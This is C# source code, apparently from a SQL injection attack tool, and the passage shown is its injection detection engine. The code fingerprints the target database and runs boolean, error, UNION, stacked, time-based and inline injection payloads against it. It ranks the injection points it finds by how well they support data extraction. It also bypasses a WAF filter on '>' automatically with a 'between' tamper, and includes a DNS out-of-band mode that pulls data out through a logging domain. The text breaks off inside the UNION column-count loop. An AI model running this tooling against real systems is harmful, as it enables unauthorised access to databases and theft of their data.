using SuperSQLInjectionV2.Bypass;
using SuperSQLInjectionV2.Models;
using SuperSQLInjectionV2.Models.Data;
using SuperSQLInjectionV2.Models.Detect;
using SuperSQLInjectionV2.Tools.Http;
using SuperSQLInjectionV2.ViewModels;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace SuperSQLInjectionV2.Tools.Inject
{
    /// <summary>
    /// 全面对标业界同类工具的注入点检测引擎：
    /// 1. 动态特征分析（3次原始请求建立页面模板）
    /// 2. checkDynParam 参数动态性预检（静态参数跳过基于页面内容的检测技术）
    /// 3. 单引号探针 + 错误信息DBMS指纹，指纹命中后按库过滤用例
    /// 4. 按 B→E→U→S→T→Q 顺序遍历payload用例库（level/risk/dbms/clause/where/ptype矩阵过滤）
    /// 5. 确认即停，构造与后续取数利用流程兼容的注入标记
    /// </summary>
    public static class InjectDetectEngine
    {
        //默认相似度阈值：真值页>=0.98视为与模板一致，真假差值>=0.02视为可区分
        private const double UpperBound = 0.98;
        private const double MinDelta = 0.02;
        //Union列数探测的相似度阈值（默认0.95）
        private const double UnionBound = 0.95;
        //检测技术遍历顺序：布尔→报错→Union→堆叠→时间→内联（确认即停）
        private static readonly int[] TechniqueOrder = { 1, 2, 6, 4, 5, 3 };

        /// <summary>
        /// V2数据库类型 → DBMS名称
        /// </summary>
        private static readonly Dictionary<DBType, string> V2ToDbmsName = new Dictionary<DBType, string>
        {
            { DBType.MySQL, "MySQL" },
            { DBType.SQLServer, "Microsoft SQL Server" },
            { DBType.Oracle, "Oracle" },
            { DBType.PostgreSQL, "PostgreSQL" },
            { DBType.Access, "Microsoft Access" },
            { DBType.DB2, "IBM DB2" },
            { DBType.SQLite, "SQLite" },
            { DBType.Informix, "Informix" },
            { DBType.DM, "DM" },
            { DBType.Kingbase, "KingbaseES" },
            { DBType.OpenGauss, "openGauss" },
            { DBType.H2, "H2" },
            { DBType.HSQLDB, "HSQLDB" },
            { DBType.ClickHouse, "ClickHouse" }
        };

        /// <summary>
        /// 国产库语法兼容映射：达梦兼容Oracle、人大金仓兼容PostgreSQL。
        /// 用例库无国产库专属用例，过滤/解析用例dbms时按兼容库对待，
        /// 使Oracle/PG专属用例（报错、时间等）对国产库同样生效。
        /// </summary>
        private static DBType CompatDb(DBType db)
        {
            return db switch
            {
                DBType.DM => DBType.Oracle,
                DBType.Kingbase => DBType.PostgreSQL,
                //openGauss基于PostgreSQL 9.2，共用PG检测用例
                DBType.OpenGauss => DBType.PostgreSQL,
                _ => db
            };
        }

        private class Ctx
        {
            public AppConfig Config = null!;
            public HttpRequest BaseReq = null!;
            public string PName = "";
            public string PValue = "";
            public string Template = "";
            public List<ChangeFeature> Features = new List<ChangeFeature>();
            public HttpResponse OrigResponse = null!;
            public List<DBType> DbCandidates = new List<DBType>();
            public int[] Ptypes = { 1 };
            public bool Dynamic = true;
            public int BaseSec = -1;
            //基线响应抖动（max-min，毫秒）：抖动大时时间类检测增加一轮确认
            public int BaseJitterMs = 0;
            //页面模板自身稳定性：3次原始请求两两ratio均>=0.98视为稳定
            public bool Stable = true;
            //注入位置（Query/BodyForm/Cookie/Header/BodyJson/Uri）与头名称（Place=Header时用）
            public ParamPlace Place = ParamPlace.Query;
            public string HeaderName = "";
            //URI路径段注入时的段序号（0基，非空段计数，与MyTools.GetUriSegments一致）
            public int UriIndex = -1;
        }

        /// <summary>
        /// 对单个参数执行多技术检测，不命中不停：每种技术类型各取一个命中（同类型确认即跳过剩余用例），
        /// 全部技术检测完毕后返回所有命中，列表按利用价值升序排列（最后一个为最优注入点，调用方顺序应用即可）。
        /// place/headerName用于Cookie（level>=2）、User-Agent/Referer等HTTP头（level>=3）、JSON请求体位置的注入检测。
        /// </summary>
        public static async Task<List<InjectPoint>> DetectParam(AppConfig config, string requestTxt, string pname, string pvalue,
            ParamPlace place = ParamPlace.Query, string headerName = "", int uriIndex = -1)
        {
            List<InjectPoint> hits = new List<InjectPoint>();
            Ctx ctx = new Ctx { Config = config, PName = pname, PValue = pvalue ?? "", Place = place, HeaderName = headerName, UriIndex = uriIndex };
            try
            {
                int level = Math.Max(1, Math.Min(5, config.DataConfig.DetectLevel));
                int risk = Math.Max(1, Math.Min(3, config.DataConfig.DetectRisk));
                ctx.BaseReq = new HttpRequest(config, requestTxt);

                //1. 动态特征分析：3次原始请求建立页面模板
                List<string> pages = new List<string>();
                for (int i = 0; i < 3; i++)
                {
                    config.CheckStop();
                    pages.Add((await HTTPTool.SendRequestRetryAsync(new HttpRequest(config, requestTxt)).ConfigureAwait(false)).BodyTxt ?? "");
                }
                ctx.Features = WebPageDiffAnalyzer.AnalyzeThreePages(pages[0], pages[1], pages[2]);
                ctx.Template = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[0]);
                //页面稳定性校验（页面不稳定告警）：
                //3次原始请求两两比对，模板自身波动大时布尔/Union的相似度判定不可靠，明确告警而不是静默误报
                double minRatio = 1.0;
                for (int i = 0; i < pages.Count; i++)
                {
                    for (int j = i + 1; j < pages.Count; j++)
                    {
                        string ci = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[i]);
                        string cj = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, pages[j]);
                        double r = PageLikeTool.CalculateSimilarity(ci, cj);
                        if (r < minRatio)
                        {
                            minRatio = r;
                        }
                    }
                }
                ctx.Stable = minRatio >= UpperBound;
                if (!ctx.Stable)
                {
                    Log.Warning("目标页面内容不稳定（模板内最小相似度" + minRatio.ToString("F4") + " < " + UpperBound + "），布尔/Union相似度判定可信度下降！建议换稳定页面，或在数据操作页手工指定判断依据（关键字/状态码）。");
                }
                ctx.OrigResponse = await HTTPTool.SendRequestRetryAsync(new HttpRequest(config, requestTxt)).ConfigureAwait(false);

                //2. checkDynParam：参数动态性预检
                ctx.Dynamic = await CheckDynamic(ctx).ConfigureAwait(false);
                if (!ctx.Dynamic)
                {
                    //与业界惯例一致：仅提示疑似非动态参数，不跳过任何技术（静态误报由比对算法自身兜底）
                    Log.Show("参数" + pname + "看起来不是动态参数，仍继续全量检测（页面相似度将由各技术用例自行判定）！");
                }

                //--smart 智能模式：启发式无任何迹象（非动态+后续探针无指纹）时跳过深度检测
                bool smart = config.DataConfig.SmartMode;
                if (smart && !ctx.Dynamic)
                {
                    Log.Show("智能模式：参数" + pname + "疑似非动态（若启发式探针无错误指纹将跳过深度检测）！");
                }

                //3. 启发式探针组 + 错误信息DBMS指纹（启发式探测）：
                //单/双引号、括号、逗号探针逐一探测并合并指纹，比单引号一探针收窄库候选更准，减少后续无效发包
                string probeReq = BuildRequest(ctx, ProbeMarkedValue(ctx));
                string[] probes = { "'", "\"", ")", "'))", "," };
                HashSet<DBType> probeFound = new HashSet<DBType>();
                foreach (string probe in probes)
                {
                    config.CheckStop();
                    HttpResponse probeResp = await Send(ctx, probeReq, probe).ConfigureAwait(false);
                    foreach (string dbName in InjectTools.ScanDbByError(probeResp.BodyTxt ?? ""))
                    {
                        DBType pdb = ParseDbName(dbName);
                        if (pdb != DBType.UnKnow)
                        {
                            probeFound.Add(pdb);
                        }
                    }
                }
                ctx.DbCandidates = probeFound.ToList();
                if (ctx.DbCandidates.Count > 0)
                {
                    Log.Show("通过错误信息指纹，数据库可能为：" + string.Join(",", ctx.DbCandidates));
                }
                //--smart：启发式（动态性+错误指纹）均无任何迹象时，跳过整个深度检测电池（与 smart 语义一致：positive heuristics才深测）
                if (smart && !ctx.Dynamic && ctx.DbCandidates.Count == 0)
                {
                    Log.Show("智能模式：参数" + pname + "启发式无任何迹象（非动态+无错误指纹），跳过深度检测！注意：头注入/写入型注入（页面不随参数变化且无报错回显）会被跳过，此类目标请关闭智能模式重测。");
                    return hits;
                }

                //4. ptype判定：纯数字值只测数字边界，其余测字符串类边界
                ctx.Ptypes = Regex.IsMatch(ctx.PValue, @"^-?\d+(\.\d+)?$") ? new[] { 1 } : new[] { 2, 3, 4, 5, 8 };

                //5. 按技术顺序遍历用例×边界矩阵
                foreach (int stype in TechniqueOrder)
                {
                    config.CheckStop();
                    //注1：对疑似非动态参数仅告警不跳过（静态参数上比对类用例天然不命中，无需预过滤）
                    //注2：--smart只在"非动态+无指纹"时整体跳过（闸门B）；有指纹即全技术检测，不做技术裁剪
                    List<PayloadTest> tests = InjectPayloadLoader.GetTests(stype, level, risk)
                        .OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
                    if (tests.Count == 0)
                    {
                        continue;
                    }
                    Log.Show("正在进行" + TechniqueName(stype) + "检测（" + tests.Count + "个用例，Level<=" + level + "，Risk<=" + risk + "）……");
                    foreach (PayloadTest test in tests)
                    {
                        config.CheckStop();
                        if (!DbmsMatch(test, ctx.DbCandidates))
                        {
                            continue;
                        }
                        foreach (PayloadBoundary boundary in MatchBoundaries(test, level, ctx.Ptypes))
                        {
                            config.CheckStop();
                            //用例语义：每个test.where值单独构造payload（1=拼在原值后，2=负值替换，3=整体替换）
                            foreach (int where in test.Where)
                            {
                                if (!boundary.Where.Contains(where))
                                {
                                    continue;
                                }
                                InjectPoint? hit = await (stype switch
                                {
                                    1 => TryBoolean(ctx, test, boundary, where, false),
                                    2 => TryError(ctx, test, boundary, where),
                                    6 => TryUnion(ctx, test, boundary, where),
                                    4 => TryTime(ctx, test, boundary, where, true),
                                    5 => TryTime(ctx, test, boundary, where, false),
                                    3 => TryBoolean(ctx, test, boundary, where, true),
                                    _ => Task.FromResult<InjectPoint?>(null)
                                }).ConfigureAwait(false);
                                if (hit != null && hit.IsInject)
                                {
                                    hits.Add(hit);
                                    //命中后该数据库可信度提升，后续技术的dbms专属用例按命中库过滤
                                    if (hit.DBType != DBType.UnKnow && !ctx.DbCandidates.Contains(hit.DBType))
                                    {
                                        ctx.DbCandidates.Add(hit.DBType);
                                    }
                                    //穷举模式（G2开关）：命中后继续测完其余技术，注入记录给出完整画像；默认命中即跳到下一技术
                                    if (!config.DataConfig.DetectExhaustive)
                                    {
                                        goto NextTechnique;
                                    }
                                    goto NextTest;
                                }
                            }
                        }
                        NextTest:;
                        }
                    NextTechnique:;
                }
                //6. DNS外带探测（可选开关，本工具扩展）：不依赖页面响应/延时，payload携带唯一token触发数据库
                //向 token.DNSLog域名 发起DNS解析，平台侧回收确认，可发现无回显无延时的盲注点
                if (config.DataConfig.DetectDnsOob)
                {
                    InjectPoint? dnsHit = await TryDnsOob(ctx, level, risk).ConfigureAwait(false);
                    if (dnsHit != null && dnsHit.IsInject)
                    {
                        hits.Add(dnsHit);
                        if (dnsHit.DBType != DBType.UnKnow && !ctx.DbCandidates.Contains(dnsHit.DBType))
                        {
                            ctx.DbCandidates.Add(dnsHit.DBType);
                        }
                    }
                }
                //按利用价值升序：调用方顺序应用后，最优注入点（Union>报错>布尔>时间）成为当前生效配置
                return hits.OrderBy(ExploitPriority).ToList();
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception e)
            {
                Log.Error("检测引擎异常：" + e.Message);
            }
            return hits;
        }

        /// <summary>
        /// 注入点利用价值评分：Union取数最快，报错次之，布尔盲注逐位判断，时间盲注最慢
        /// </summary>
        private static int ExploitPriority(InjectPoint inp)
        {
            if (inp.InjectType == InjectType.Union)
            {
                return 50;
            }
            if (inp.InjectType == InjectType.Error)
            {
                return 40;
            }
            //堆叠点：取数速度等同时间盲注，但具备多语句写操作/命令执行能力，价值高于纯时间盲注
            if (inp.InjectType == InjectType.Stacked)
            {
                return 20;
            }
            //DNS外带点：取数经DNS信道带出（每段一次请求，远快于盲注），但依赖目标出网+DNSLog配置
            if (inp.InjectType == InjectType.Dns)
            {
                return 25;
            }
            //时间盲注（独立注入类型；BoolInjectType.Time 兼容旧记录）
            if (inp.InjectType == InjectType.Time || inp.BoolInjectType == BoolInjectType.Time)
            {
                return 10;
            }
            return 30;
        }

        /// <summary>
        /// checkDynParam：向参数追加随机噪声串，页面与模板一致（ratio>=0.98）说明参数不影响页面
        /// </summary>
        private static async Task<bool> CheckDynamic(Ctx ctx)
        {
            try
            {
                string reqTxt = BuildRequest(ctx, ProbeMarkedValue(ctx));
                Random rand = new Random();
                for (int i = 0; i < 2; i++)
                {
                    ctx.Config.CheckStop();
                    string noise = MyTools.RandStr(4).ToLower ()+ rand.Next(100, 999);
                    HttpResponse resp = await Send(ctx, reqTxt, noise).ConfigureAwait(false);
                    string txt = WebPageDiffAnalyzer.ClearDynamicText(ctx.Features, resp.BodyTxt ?? "");
                    txt = InjectTools.StripPayloadReflection(txt, noise);
                    double ratio = PageLikeTool.CalculateSimilarity(ctx.Template, txt);
                    if (ratio < UpperBound)
                    {
                        return true;
                    }
                }
                return false;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch
            {
                //预检失败不阻塞检测
                return true;
            }
        }

        /// <summary>
        /// 布尔盲注/内联查询：真值双发+假值双发交叉验证（假阳性复核）
        /// </summary>
        private static async Task<InjectPoint?> TryBoolean(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, bool isInline)
        {
            if (string.IsNullOrWhiteSpace(test.ResponseComparison))
            {
                return null;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string truePayload = Rep(ctx, ph, test.RequestPayload) + comment;
            string falsePayload = Rep(ctx, ph, test.ResponseComparison) + comment;
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix));

            HttpResponse falseResp = await Send(ctx, reqTxt, falsePayload).ConfigureAwait(false);
            string falseTxt = Clear(ctx, falseResp.BodyTxt, ReflectionValue(prefix, falsePayload, suffix));
            double rFalse = PageLikeTool.CalculateSimilarity(ctx.Template, falseTxt);
            HttpResponse trueResp = await Send(ctx, reqTxt, truePayload).ConfigureAwait(false);
            string trueTxt = Clear(ctx, trueResp.BodyTxt, ReflectionValue(prefix, truePayload, suffix));
            double rTrue = PageLikeTool.CalculateSimilarity(ctx.Template, trueTxt);

            if (ConstData.ErrorHttpCode.Contains(trueResp.StatusCode) || ConstData.ErrorHttpCode.Contains(falseResp.StatusCode)
                || trueResp.BodyLength <= 0 || falseResp.BodyLength <= 0)
            {
                return null;
            }

            //判定一：状态码差异（与旧检测一致）
            bool byCode = ctx.OrigResponse != null
                && ctx.OrigResponse.StatusCode == trueResp.StatusCode
                && trueResp.StatusCode != falseResp.StatusCode;
            //判定二：ratio判定
            bool byRatio = rTrue >= UpperBound && rFalse < UpperBound && (rTrue - rFalse) >= MinDelta;
            if (!byCode && !byRatio)
            {
                return null;
            }

            //交叉验证：全新随机占位的第二组真值/假值，排除页面抖动与回显干扰
            PayloadPlaceholder ph2 = new PayloadPlaceholder();
            string prefix2 = Rep(ctx, ph2, boundary.Prefix);
            string suffix2 = Rep(ctx, ph2, boundary.Suffix);
            string comment2 = Rep(ctx, ph2, test.RequestComment);
            string truePayload2 = Rep(ctx, ph2, test.RequestPayload) + comment2;
            string falsePayload2 = Rep(ctx, ph2, test.ResponseComparison) + comment2;
            string reqTxt2 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, truePayload2), prefix2, suffix2));
            HttpResponse true2Resp = await Send(ctx, reqTxt2, truePayload2).ConfigureAwait(false);
            double rTrue2 = PageLikeTool.CalculateSimilarity(ctx.Template, Clear(ctx, true2Resp.BodyTxt, ReflectionValue(prefix2, truePayload2, suffix2)));
            if (rTrue2 < UpperBound)
            {
                return null;
            }
            HttpResponse false2Resp = await Send(ctx, reqTxt2, falsePayload2).ConfigureAwait(false);
            double rFalse2 = PageLikeTool.CalculateSimilarity(ctx.Template, Clear(ctx, false2Resp.BodyTxt, ReflectionValue(prefix2, falsePayload2, suffix2)));
            if (rFalse2 >= UpperBound || (rTrue2 - rFalse2) < MinDelta)
            {
                return null;
            }

            //invalid-bignum/invalid-string反证（假阳性复核，where=1追加语义全类型覆盖）：
            //不可能存在的值（大负数/长随机串）替换原值后附加真值payload——真注入时记录不存在，页面应偏离模板（同假值页）；
            //若页面仍与模板一致，说明参数未进入查询条件，真假差异是记录存在性/页面反射造成的假象，判定误报
            if (where == 1)
            {
                bool numeric = ctx.Ptypes.Length == 1 && ctx.Ptypes[0] == 1;
                string invalidValue = numeric
                    ? "-" + new Random().Next(100000000, 2000000000).ToString()
                    : MyTools.RandStr(24).ToLower();
                string invalidKind = numeric ? "invalid-bignum" : "invalid-string";
                string reqBig = BuildRequest(ctx, MarkedValue(ctx, invalidValue, prefix, suffix));
                HttpResponse bigResp = await Send(ctx, reqBig, truePayload).ConfigureAwait(false);
                double rBig = PageLikeTool.CalculateSimilarity(ctx.Template, Clear(ctx, bigResp.BodyTxt, ReflectionValue(prefix, truePayload, suffix)));
                if (rBig >= UpperBound)
                {
                    Log.Show(invalidKind + "反证：不可能值替换后页面无差异（ratio=" + rBig.ToString("F4") + "），布尔命中判定为误报，跳过！");
                    return null;
                }
            }

            string techName = isInline ? "内联查询" : "布尔盲注";
            Log.Warning("发现" + techName + "注入！用例：" + test.Title);
            InjectPayloadManager.RecordHit(test);
            Log.Show("页面ratio(false|true|true2|false2)：" + rFalse.ToString("F4") + "|" + rTrue.ToString("F4") + "|" + rTrue2.ToString("F4") + "|" + rFalse2.ToString("F4"));

            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Blind;
            inp.DBType = ResolveDb(test, ctx);
            //识别真假页面判断条件，供盲注取数（直接从模板词表挑选：在真值原文出现、假值原文不出现，
            //避免CheckTheKey的时间兜底把快速页面误判成时间盲注，也避免选中会被payload回显干扰的词）
            //三级兜底：关键字→状态码→长度(大于/小于)
            void SelectJudge(HttpResponse t, HttpResponse f)
            {
                inp.BoolInjectType = BoolInjectType.KeyWord;
                string? key = FindBlindKey(ctx.Template, t.BodyTxt, f.BodyTxt, out bool revers);
                inp.Revers = revers;
                if (!string.IsNullOrEmpty(key))
                {
                    inp.CheckValue = key;
                    Log.Success("发现盲注判断值！" + key + (revers ? "（反向）" : ""));
                }
                else if (t.StatusCode != f.StatusCode)
                {
                    inp.BoolInjectType = BoolInjectType.Code;
                    inp.CheckValue = t.StatusCode.ToString();
                    inp.Revers = false;
                    Log.Show("响应状态码" + inp.CheckValue + "可以作为盲注判断条件！");
                }
                else
                {
                    //长度兜底：ratio已证实真假页面有差异，用假值页长度做大于/小于判断
                    inp.BoolInjectType = t.BodyLength > f.BodyLength ? BoolInjectType.MaxLength : BoolInjectType.MinLength;
                    inp.CheckValue = f.BodyLength.ToString();
                    inp.Revers = false;
                    Log.Show("未找到稳定关键字，使用响应长度" + (inp.BoolInjectType == BoolInjectType.MaxLength ? ">" : "<") + inp.CheckValue + "作为盲注判断条件！");
                }
            }
            //判定条件回放：选出的判断方式必须在指定真/假响应上判定正确（真→true、假→false）
            bool JudgeOk(HttpResponse t, HttpResponse f)
            {
                return TruthOracle.IsTrue(t, inp.CheckValue, inp.Revers, inp.BoolInjectType)
                       && !TruthOracle.IsTrue(f, inp.CheckValue, inp.Revers, inp.BoolInjectType);
            }

            SelectJudge(trueResp, falseResp);
            //回放验证：用交叉验证的全新随机第二组真/假响应验证判断条件（零额外发包）；
            //失败则用第二组响应重新选取并反向回放（关键字不稳自动降级到状态码/长度）
            if (!JudgeOk(true2Resp, false2Resp))
            {
                Log.Warning("盲注判断条件回放未通过（方式=" + inp.BoolInjectType + "），用第二组响应重新选取……");
                SelectJudge(true2Resp, false2Resp);
                if (JudgeOk(trueResp, falseResp))
                {
                    Log.Success("回放降级后判断条件有效：" + inp.BoolInjectType + "=" + inp.CheckValue);
                }
                else
                {
                    Log.Warning("判断条件双向回放均未通过（页面可能动态性过强），取数可能不稳定，建议在数据操作页手工指定判断依据！");
                }
            }
            inp.TestPayload = truePayload;
            inp.Where = where;
            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, truePayload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            //防脏数据校验基线：记录真/假页状态码，取数探测出现意外码时作废重发+触发逐字符NOT复核
            inp.TrueCode = trueResp.StatusCode;
            inp.FalseCode = falseResp.StatusCode;
            //'>'过滤自动适配：盲注二分取数全靠'>'，被WAF过滤时取数静默失败；
            //自动验证'>'oracle，失效则尝试between重写并真/假双验证，有效则记录AutoTamper随注入记录保存
            inp.AutoTamper = await AdaptGtFiltering(ctx, inp).ConfigureAwait(false);
            Log.Success("存在" + techName + "payload：" + truePayload);
            return inp;
        }

        /// <summary>
        /// '>'过滤自动适配（自动tamper适配机制）：
        /// 用户未启用任何tamper脚本时，先发送含'>'的真值条件验证'>'oracle；失真则判定'>'被过滤，
        /// 用between（NOT BETWEEN重写）本地变换真/假条件各发一次双验证，双双判定正确才采纳，
        /// 返回tamper名记录到注入点（不改动全局配置，取数恢复注入记录时自动启用对应tamper）
        /// </summary>
        private static async Task<string> AdaptGtFiltering(Ctx ctx, InjectPoint inp)
        {
            try
            {
                //用户已启用编码工具：尊重用户选择，不自动适配（用户已配置tamper则跳过）
                if (ctx.Config.ByPassConfig.EncodeTools.Any(s => s.Enable))
                {
                    return "";
                }
                int n = new Random().Next(1000, 8999);
                string condTrue = "(" + (n + 1) + ">" + n + ")";
                HttpResponse trueResp = await Send(ctx, inp.RequestTxt, condTrue).ConfigureAwait(false);
                if (TruthOracle.IsTrue(trueResp, inp.CheckValue, inp.Revers, inp.BoolInjectType))
                {
                    //'>'未被过滤，无需适配
                    return "";
                }
                Log.Warning("检测到 '>' 疑似被过滤（真值条件 " + condTrue + " 判定失真），尝试自动适配 between tamper……");
                //解析内置between（统一注册表EncodeToolRegistry，C#实现）
                var betweenFound = ScriptTamperEngine.FindBuiltinScript("between");
                if (betweenFound == null)
                {
                    return "";
                }
                EncodeToolModel between = new EncodeToolModel
                {
                    Name = betweenFound.Name,
                    Key = betweenFound.Key,
                    Builtin = true,
                    Enable = false
                };
                //本地变换验证（不动全局配置）：真/假条件经between重写后判定双双正确才采纳
                string adaptedTrue = ScriptTamperEngine.Tamper(between, condTrue);
                string condFalse = "(" + n + ">" + (n + 1) + ")";
                string adaptedFalse = ScriptTamperEngine.Tamper(between, condFalse);
                if (string.IsNullOrEmpty(adaptedTrue) || adaptedTrue == condTrue || string.IsNullOrEmpty(adaptedFalse))
                {
                    return "";
                }
                HttpResponse at = await Send(ctx, inp.RequestTxt, adaptedTrue).ConfigureAwait(false);
                HttpResponse af = await Send(ctx, inp.RequestTxt, adaptedFalse).ConfigureAwait(false);
                bool ok = TruthOracle.IsTrue(at, inp.CheckValue, inp.Revers, inp.BoolInjectType)
                          && !TruthOracle.IsTrue(af, inp.CheckValue, inp.Revers, inp.BoolInjectType);
                if (ok)
                {
                    Log.Success("'>' 过滤自动适配成功：between（NOT BETWEEN重写）真/假双验证通过，已随注入记录保存，取数恢复记录时自动启用！");
                    return "between";
                }
                Log.Warning("'>' 疑似被过滤，between自动适配验证未通过，建议在防护绕过页手工尝试其他tamper！");
            }
            catch (Exception e)
            {
                Log.SysLog("AdaptGtFiltering:" + e.Message);
            }
            return "";
        }

        /// <summary>
        /// 报错注入：响应正则命中报错标记（Python命名组语法转.NET，基线预检防误报，复发确认）
        /// </summary>
        private static async Task<InjectPoint?> TryError(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where)
        {
            if (string.IsNullOrWhiteSpace(test.ResponseGrep))
            {
                return null;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string pattern = Rep(ctx, ph, test.ResponseGrep).Replace("(?P<result>", "(?<result>", StringComparison.Ordinal);
            Regex regex;
            try
            {
                regex = new Regex(pattern, RegexOptions.IgnoreCase | RegexOptions.Singleline);
            }
            catch
            {
                return null;
            }
            //基线页面已命中该正则则无法区分，跳过此用例
            if (regex.IsMatch(ctx.Template ?? ""))
            {
                return null;
            }
            string payload = Rep(ctx, ph, test.RequestPayload) + Rep(ctx, ph, test.RequestComment);
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
            HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            if (ConstData.ErrorHttpCode.Contains(resp.StatusCode))
            {
                return null;
            }
            //剔除页面回显的注入payload（原文/URL编码/HTML编码形态），
            //否则正则可能命中回显SQL中的分隔符字面量（如CONCAT('0x..',...,'0x..')），把SQL自身文本当成报错结果
            string body1 = InjectTools.StripPayloadReflection(resp.BodyTxt ?? "", payload);
            Match match = regex.Match(body1);
            if (!match.Success)
            {
                return null;
            }
            //复发确认，排除偶发内容
            HttpResponse resp2 = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            if (!regex.IsMatch(InjectTools.StripPayloadReflection(resp2.BodyTxt ?? "", payload)))
            {
                return null;
            }
            //边界有效性验证：报错正则可能匹配到boundary拼接产生的SQL语法错误（如前后缀括号不配平），
            //这类"命中"在利用阶段拼接取数payload时同样是语法错误，取不到数据。
            //用同边界发恒真条件探针，命中语法错误指纹则判定此boundary不可用，跳过继续尝试其他boundary
            string probePayload = " AND 1=1";
            string probeReq = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, probePayload), prefix, suffix));
            HttpResponse probeResp = await Send(ctx, probeReq, probePayload).ConfigureAwait(false);
            if (IsSyntaxErrorPage(probeResp.BodyTxt))
            {
                return null;
            }

            Log.Warning("发现报错注入！用例：" + test.Title);
            Group resultGroup = match.Groups["result"];
            if (resultGroup.Success && !string.IsNullOrEmpty(resultGroup.Value))
            {
                Log.Show("报错回显内容：" + resultGroup.Value);
            }

            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Error;
            inp.DBType = ResolveDb(test, ctx);
            //SQLite的cast(... as int)失败不抛错（返回0），报错取数原理性不可行，忽略该命中避免误导
            if (inp.DBType == DBType.SQLite)
            {
                Log.Warning("SQLite不支持报错取数（cast失败不抛错），忽略本次报错命中");
                return null;
            }
            //确认入库后再计数（被忽略/反证否决的命中不计）
            InjectPayloadManager.RecordHit(test);
            inp.TestPayload = payload;
            inp.Where = where;
            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            Log.Success("存在报错注入payload：" + payload);
            return inp;
        }

        /// <summary>
        /// Union查询：递增列数定位（字符填充看回显/NULL填充看相似度+列数+1反证），再逐列定位显示位
        /// </summary>
        private static async Task<InjectPoint?> TryUnion(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where)
        {
            //列数范围：用例指定则用之，否则默认1-10
            int colStart = 1;
            int colStop = 10;
            Match mcol = Regex.Match(test.RequestColumns ?? "", @"(\d+)\s*-\s*(\d+)");
            if (mcol.Success)
            {
                colStart = int.Parse(mcol.Groups[1].Value);
                colStop = int.Parse(mcol.Groups[2].Value);
            }
            colStop = Math.Min(colStop, 50);

            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string? charExpr = ResolveUnionChar(test, ph);
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix));
            //FROM兜底变体（指纹命中库优先，其后依次尝试无FROM/DUAL/SYSDUMMY1/VALUES）：
            //指纹未命中时Oracle/DB2/HSQLDB等严格库也能通过变体复测检出，不再漏检
            string fromPrimary = ctx.DbCandidates.Any(d => d == DBType.Oracle || d == DBType.DM) ? " FROM DUAL"
                : ctx.DbCandidates.Any(d => d == DBType.HSQLDB) ? " FROM (VALUES(0))"
                : ctx.DbCandidates.Any(d => d == DBType.DB2) ? " FROM SYSIBM.SYSDUMMY1" : "";
            List<string> fromVariants = new List<string> { fromPrimary };
            foreach (string v in new[] { "", " FROM DUAL", " FROM SYSIBM.SYSDUMMY1", " FROM (VALUES(0))" })
            {
                if (!fromVariants.Contains(v))
                {
                    fromVariants.Add(v);
                }
            }

            //1. 定位列数
            bool dbg = Environment.GetEnvironmentVariable("SQLI_DEBUG_UNION") == "1";
            int foundCount = -1;
            //null=列数来自ORDER BY路径（FROM未定）；非null=填充路径确定的FROM变体
            string? usedFrom = null;
            //1a. ORDER BY路径（仅where=1追加语义，优先路径）：
            //原查询上递增列号探针，页面保持模板态=列有效，首个报错/剧变列号-1即列数；比NULL填充更耐"内容总变"页面
            if (where == 1)
            {
                for (int c = 1; c <= colStop; c++)
                {
                    ctx.Config.CheckStop();
